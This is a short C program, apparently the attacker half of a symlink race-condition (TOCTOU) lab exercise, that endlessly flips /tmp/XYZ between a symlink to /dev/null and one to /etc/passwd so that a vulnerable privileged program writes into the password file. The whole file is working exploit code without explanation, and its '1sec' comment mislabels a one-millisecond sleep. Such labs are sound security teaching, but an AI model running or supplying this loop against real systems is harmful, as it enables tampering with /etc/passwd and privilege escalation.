#include <unistd.h>

int main()
{
   while(1) {
     unlink("/tmp/XYZ");
     symlink("/dev/null", "/tmp/XYZ");
     usleep(1000); //1sec

     unlink("/tmp/XYZ");
     symlink("/etc/passwd", "/tmp/XYZ");
     usleep(1000);
   }

   return 0;
}
